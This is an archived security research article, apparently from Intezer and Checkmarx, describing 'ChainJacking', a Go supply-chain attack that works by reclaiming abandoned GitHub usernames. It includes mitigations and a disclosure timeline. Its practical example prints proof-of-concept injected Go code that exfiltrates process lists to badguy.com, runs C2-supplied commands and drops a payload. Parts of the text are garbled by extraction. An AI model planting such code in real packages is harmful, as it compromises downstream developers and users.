{
    "id": "71348318-8d20-4685-9a8f-d6da36a3e2b5",
    "created_at": "2023-01-12T15:07:54.618007Z",
    "updated_at": "2025-03-27T02:05:24.835876Z",
    "deleted_at": null,
    "sha1_hash": "6f1b2faf05d898a9b5af546c709c894d892ce00b",
    "title": "2021-11-16 - New Type of Supply Chain Attack Could Put Popular Admin Tools at Risk",
    "authors": "",
    "file_creation_date": "2022-05-28T03:49:42Z",
    "file_modification_date": "2022-05-28T03:49:42Z",
    "file_size": 157713,
    "plain_text": "# New Type of Supply Chain Attack Could Put Popular Admin Tools at Risk\n\n**[intezer.com/blog/malware-analysis/chainjacking-supply-chain-attack-puts-popular-admin-tools-at-risk/](https://www.intezer.com/blog/malware-analysis/chainjacking-supply-chain-attack-puts-popular-admin-tools-at-risk/)**\n\nJoakim Kennedy, Alik Koldobsky November 16, 2021\n\n### Get Free Account\n\nJoin Now\n\n[Research between Intezer and Checkmarx describes ChainJacking, a type of software supply chain attack that could be potentially exploited](https://checkmarx.com/)\nby threat actors and puts common admin tools at risk.\n\nWe have identified a number of open-source Go packages that are susceptible to ChainJacking given that some of these vulnerable packages\nare embedded in popular admin tools.\n\nThe nature of transitive trust between open-source security (OSS) makes this technique highly difficult to defend at the developer level using\nopen-source software.\n\n[To help the infosec community protect against this type of attack, we developed an open-source tool which can be used to scan source code](https://github.com/checkmarx/chainjacking)\nand detect if packages downloaded from GitHub and other sources are vulnerable. You can also scan the binaries of any program in Intezer\nAnalyze to make sure they don’t contain vulnerable packages or ChainJacking vulnerable Git repositories.\n\n## Intro\n\nAn attacker slipping through the cracks between the designs of GitHub and Go Package Manager could allow them to take control over\npopular Go packages, poison them, and infect both developers and users.\n\nGo build tools provide an easy way for developers to download and use open-source libraries in their projects. Compared to other languages\nsuch as Python and Rust, Go doesn’t use a central repository where libraries can be downloaded from. Instead, the Go tooling pulls code\npackages straight from version control systems such as GitHub¹.\n\nGitHub is the largest source-code repository on the internet, with the majority of Go packages hosted on it. One feature GitHub provides is\nallowing users to change usernames.\n\nThe change of username process is quick and simple. A warning lets you know that all traffic for the old repository’s URL will be redirected to\nthe new one.\n\n\n-----\n\nusername\n\n\nWhat GitHub doesn’t mention in this alert is an important implication that it does list in its documentation:\n\n**_“After changing your username, your old username becomes available for anyone else to claim.“_**\n\nThis means that an attacker can easily claim the abandoned username and start serving up malicious code to anyone who downloads the\npackage, relying on the credibility gained by its former owner. Doing so in a Go package repository could result in a chain reaction that\nsubstantially widens the code distribution and infects large numbers of downstream products.\n\nLet’s lay out the blueprint for this relatively simple yet potentially catastrophic attack vector.\n\n____________________________\n\n¹ We are focusing on Go but other package managers like NPM also allow code pulling from version control systems which makes them\nsusceptible to this kind of attack as well.\n\n## Direct ChainJacking\n\nLet’s give an example scenario. A developer named Annastacia opens a GitHub account under the username “Annastacia.” She then\npublishes a useful Go package in a repository under the name “useful.” Anyone who wants to use this package can either download and install\nit via “go get github.com/Annastacia/useful,” or import it into their code via “import github.com/Annastacia/useful.” This action will add an entry\nto the “go.mod” file, allowing the tooling provided by Go to easily update the package when new versions are released.\n\nSome time has now gone by and thanks to its usefulness, the package has become popular. Annastacia decides that she wants a shorter\nname for her repository and with just a few clicks she changes her GitHub username to “Anna.” Subsequently, two things will happen:\n\n1. The username “Annastacia” is now available to be registered by anyone else.\n2. All requests for “github.com/Annastacia/useful” are now redirected to “github.com/Anna/useful.”\n\nAll current packages using github.com/Annastacia/useful can still use it as before, so nothing breaks and there are no user complaints as of\nyet².\n\nIf a malicious actor manages to claim the “Annastacia” username, they can then publish their own malicious code under the repository name\n“useful.” This action breaks the redirect to “Anna/useful” and GitHub now serves the threat actor’s malicious code from\n“github.com/Annastacia/useful,” which could compromise anyone using the old URL.\n\nThe concept is rather simple. Now, every new installation of this package can potentially infect the installing developer’s machine. Even more\npotentially damaging, any new package or third-party product written in the future which depends on this infected package will also cause\ninfections on any machine it is installed on.\n\n____________________________\n\n² Given that the owner dealt with the Go module configuration the right way.\n\n\n-----\n\nFenris\n\n## Meet go.mod & go.sum\n\n\n-----\n\nt e attac sce a o desc bed abo e, t e ct s ac e s ected by d ect y ca g o t e po so ed pac age s s assu g t e\nvictim called Annastacia’s old repository URL and not the new one. As previously mentioned, a successful attack can also occur when the\npoisoned package is called indirectly, as a dependency of another package, preferably a popular one. However, this kind of attack raises new\nchallenges for the attacker.\n\nDependencies in a Go project are managed by two files, go.mod and go.sum. The go.mod file holds a complete list of the module’s\ndependencies and their versions, while the go.sum file holds a complete list of the module’s dependencies, their versions, and a checksum of\nthe package.\n\nLooking at this from the viewpoint of an attacker, if they manage to take control over a package, found in the go.mod and go.sum files of a\npopular package, and poison it while leaving it in the same version, the attack will fail due to a checksum mismatch³.\n____________________________\n\n³ It will most likely fail even before this point because Go tooling will pull the cached package and not access the poisoned repository.\n\nFor an attack to succeed, they must publish a new version of the package and in some way, lure the owner of the package to update its\ndependencies. This is a significant challenge for the attacker with the obvious solution being a manual pull request, or in case the GitHub\nrepository is configured that way, an automatic pull request from GitHub’s dependabot.\n\n## Potential Impact\n\nWe believe that ChainJacking has the potential to cause damage equivalent to the attack on SolarWinds, since some of the vulnerable Go\npackages we found are used as dependencies in popular admin tools designed to run with high privileges.\n\n\nintezer platform\n\n\nIntezer Analyze result indicating the presence of a\n\nvulnerable package’s code in popular admin tools.\n\n## Practical Example\n\nLet’s look at a commonly used open-source library and show what could happen if it was susceptible to a take-over. A popular third-party\nlogging package is called Logrus (github.com/sirupsen/logrus). If this package is vulnerable, it can be used to inject malicious code into any\napplications compiled with the “old” repository. In this mock scenario, in addition to code provided by Go standard library, we are also using the\nthird-party package github.com/mitchellh/go-ps. This package allows for enumerating the running processes on the machine and is platform\nindependent. The package has been used by multiple malware written in Go. Also, we can use go-binddata to embed an alternative payload.\n\nThe following code was added to the end of one of the files in the package. First, a new init function was created. Go allows for multiple init\nfunctions to exist in the same package. All init functions are executed before the main function is executed in a non-deterministic order.\n\nf i it() {\n\n\n-----\n\n(); {\n\nwriteAndExecute()\n\n}\n\n}\n\nfunc collectData() bool {\n\np, err := ps.Processes()\n\nif err != nil {\n\nreturn false\n\n}\n\nvar d []string\n\nfor _, v := range p {\n\nd = append(d, v.Executable())\n\n}\n\nbuf := base64.RawURLEncoding.EncodeToString([]byte(strings.Join(d, “|”)))\n\nresp, err := http.Get(fmt.Sprintf(“https://badguy.com/?s1=%s”, buf))\n\nif err != nil {\n\nreturn false\n\n}\n\ndefer resp.Body.Close()\n\nbody, err := ioutil.ReadAll(resp.Body)\n\nif err != nil {\n\nreturn false\n\n}\n\ndata := struct {\n\nCode int\n\nCmd string\n\nArgs []string\n\n}{}\n\nerr = json.Unmarshal(body, &data)\n\nif err != nil {\n\nreturn false\n\n}\n\nif data.Code != 0x1337 {\n\nreturn false\n\n}\n\ncmd := exec.Command(data.Cmd, data.Args…)\n\ncmd.Start()\n\nreturn true\n\n}\n\nfunc writeAndExecute() {\n\nvar buf []byte\n\nif runtime GOOS == “windows” {\n\n\n-----\n\n, y y ()\n\nif err != nil {\n\nreturn\n\n}\n\nbuf = b\n\n} else if runtime.GOOS == “linux” {\n\nb, err := bindataPayloadElfBytes()\n\nif err != nil {\n\nreturn\n\n}\n\nbuf = b\n\n} else {\n\nreturn\n\n}\n\nf, err := ioutil.TempFile(“”, “”)\n\nif err != nil {\n\nreturn\n\n}\n\n_, err = f.Write(buf)\n\nif err != nil {\n\nreturn\n\n}\n\nif runtime.GOOS == “linux” {\n\nerr = f.Chmod(0755)\n\nif err != nil {\n\npanic(err)\n\n}\n\n}\n\nerr = f.Sync()\n\nif err != nil {\n\nreturn\n\n}\n\nname := f.Name()\n\nerr = f.Close()\n\nif err != nil {\n\nreturn\n\n}\n\ncmd := exec.Command(name)\n\ncmd.Start()\n\ntime.Sleep(10 * time.Second)\n\n}\n\n\n-----\n\ne jected code uses co o tec ques used by ot e a a e tte Go t pe o s a p ocess e u e at o c s so et es\nperformed by malware to determine if it is executed in a sandbox or being analyzed. Another feature of the code is to perform data exfiltration\nof base64 encoded data. Command execution is simulated by allowing the Command and Control (C2) server to send a command to be\nexecuted by the injected code. Finally, an alternative payload is embedded, allowing the injected code to behave as a dropper. The same\nresource embedding library has been used by malware in the past.\n\nIf we build another application whose dependency uses the vulnerable repository, the modified logging package is included in the final binary. If\n[we analyze the binary with Intezer Analyze we can see that it detected 14 unique code genes.](http://analyze.intezer.com/)\n\n\nintezer platform 2\n\n\nWe can confirm that the unique genes are indeed part of the malicious code that we injected because we can see this section of code is\nlocated in the collectData function.\n\n\n-----\n\nintezer platform 3\n\n\n## GitHub Mitigation\n\n[In an effort to address this issue and similar ones, GitHub introduced Popular repository namespace retirement. This measure should ensure](https://github.blog/2018-04-18-new-tools-for-open-source-maintainers/#popular-repository-namespace-retirement)\nthat attacks such as ChainJacking won’t be possible on popular code packages that might have a substantial impact. To do that, GitHub\n“retires the namespace of any open-source project that had more than 100 clones in the week leading up to the owner’s account being\nrenamed or deleted.”\n\n## Mitigation Recommendations\n\nThe good news is that while ChainJacking has the potential to cause incidents with severe widespread effects, it can also be mitigated\nrelatively simply. Combining Checkmarx and Intezer’s technologies, we were able to recognize the possible source of the attack at the code\n**level while also identifying the impact of this attack vector at the application level.**\n\n[1. To help detect vulnerable packages in your dependency tree, we are released an open-source tool on GitHub. Check it out and consider](https://github.com/checkmarx/chainjacking)\n\nincorporating it into your development or build pipeline.\n[2. Scan software releases for tampering and backdoors before delivering to customers or deploying to production. Learn more about how](https://www.intezer.com/blog/malware-analysis/securing-the-software-supply-chain/)\n\nIntezer can help you release your software with peace of mind.\n\n\n-----\n\n3 C ec a o to s pac ages t at ca be ta e o e a d a e ts t e ecosyste ( c ud g Go a d G t ub) case a susp c ous act ty\nis detected. This means that Checkmarx customers are automatically protected from ChainJacking.\n\n## What’s Next?\n\nSoftware supply chain attacks are on the rise because they can be difficult to detect and have the potential for widespread impact.\nChainJacking described in this research provides attackers with new infection opportunities and further adds to the challenges companies face\nwhen securing their software supply chain.\n\nTo demonstrate the potential outcome of such an attack, we showed the direct link between a real-life vulnerable package and popular admin\ntools intended to run with high privileges. While we have found no evidence of attackers using ChainJacking in the wild at this moment, the\n[potential damage of an exploitation of this kind could be compared to the recent attacks against Kaseya and SolarWinds.](https://www.intezer.com/blog/malware-analysis/revil-attack-genetic-analysis-and-lessons-learned/)\n\n## Disclosure Timeline\n\n8 Oct 21 – Full report sent\n8 Oct 21 – GitHub acknowledges receiving the report\n20 Oct 21 – GitHub asked for clarifications\n20 Oct 21 – Clarifications sent together with a PoC video\n[30 Oct 21 – GitHub responded indicating that this is a known behavior and referenced their documentation](https://github.blog/2018-04-18-new-tools-for-open-source-maintainers/#popular-repository-namespace-retirement)\n5 Nov 21 – Email sent to Go security team\n10 Nov 21 – Response from Go security team acknowledging it as an issue but not something they could fix\n16 Nov 21 – Full disclosure\n\n**Joakim Kennedy**\nDr. Joakim Kennedy is a Security Researcher analyzing malware and tracking threat actors on a daily basis. For the last few years, Joakim has\nbeen researching malware written in Go. To make the analysis easier he has written the Go Reverse Engineering Toolkit (github.com/goretk),\nan open-source toolkit for analysis of Go binaries.\n\n**Alik Koldobsky**\nAlik has a strong security background from positions as Offensive Security Researcher both from his military service and the private sector.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-16 - New Type of Supply Chain Attack Could Put Popular Admin Tools at Risk.pdf"
    ],
    "report_names": [
        "2021-11-16 - New Type of Supply Chain Attack Could Put Popular Admin Tools at Risk.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536074,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653709782,
    "ts_modification_date": 1653709782,
    "files": {
        "pdf": "https://archive.orkl.eu/6f1b2faf05d898a9b5af546c709c894d892ce00b.pdf",
        "text": "https://archive.orkl.eu/6f1b2faf05d898a9b5af546c709c894d892ce00b.txt",
        "img": "https://archive.orkl.eu/6f1b2faf05d898a9b5af546c709c894d892ce00b.jpg"
    }
}